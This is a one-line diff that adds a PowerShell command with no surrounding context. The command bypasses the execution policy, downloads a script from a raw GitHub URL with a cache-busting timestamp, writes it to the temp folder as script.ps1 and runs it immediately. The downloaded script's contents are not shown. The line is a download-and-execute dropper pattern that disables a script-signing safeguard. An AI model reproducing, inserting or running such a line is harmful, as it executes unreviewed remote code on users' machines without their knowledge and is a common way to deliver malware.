@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -Command "$url='https://raw.githubusercontent.com/samerlulu/sAuto/main/go2.ps1?x='+[DateTime]::Now.Ticks; $out=Join-Path $env:TEMP 'script.ps1'; Remove-Item $out -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri $url -OutFile $out; & $out"
